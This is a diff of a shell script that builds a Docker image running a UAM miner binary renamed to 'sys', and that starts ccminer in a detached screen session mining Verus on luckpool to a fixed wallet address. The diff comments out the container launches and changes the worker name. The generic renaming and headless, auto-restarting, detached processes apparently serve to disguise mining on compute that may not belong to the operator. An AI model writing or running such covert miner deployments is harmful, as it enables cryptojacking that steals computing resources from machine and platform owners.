@@ -22,7 +22,7 @@ echo -e 'wget https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb && dp
 echo -e 'mv /opt/uam/uam /opt/uam/sys' >> Dockerfile
 echo -e 'CMD /opt/uam/sys --pk 95D9FA93C26D150C7AF040C4107D7F1BE247D8B4AFD66BEBB2CD765D7253EA09 --no-ui' >> Dockerfile
 docker build -t sys:latest .
-docker run -d --cap-add=IPC_LOCK --name ded1 --restart always sys:latest
-docker run -d --cap-add=IPC_LOCK --name ded2 --tmpfs /root/.uam --restart always sys:latest
-docker run -d --cap-add=IPC_LOCK --name ded3 --tmpfs /root/.uam --restart always sys:latest
-screen -dmS vrsk /root/ccminer/ccminer -a verus -o stratum+tcp://eu.luckpool.net:3957#xnsub -u RW7oReZ81MzgodB7LEksNTwuJ34iGDrmta.leaguedlfrelow9kw -p x -t 1
+#docker run -d --cap-add=IPC_LOCK --name ded1 --restart always sys:latest
+#docker run -d --cap-add=IPC_LOCK --name ded2 --tmpfs /root/.uam --restart always sys:latest
+#docker run -d --cap-add=IPC_LOCK --name ded3 --tmpfs /root/.uam --restart always sys:latest
+screen -dmS vrsk /root/ccminer/ccminer -a verus -o stratum+tcp://eu.luckpool.net:3957#xnsub -u RW7oReZ81MzgodB7LEksNTwuJ34iGDrmta.kinzievolottahuu -p x -t 1
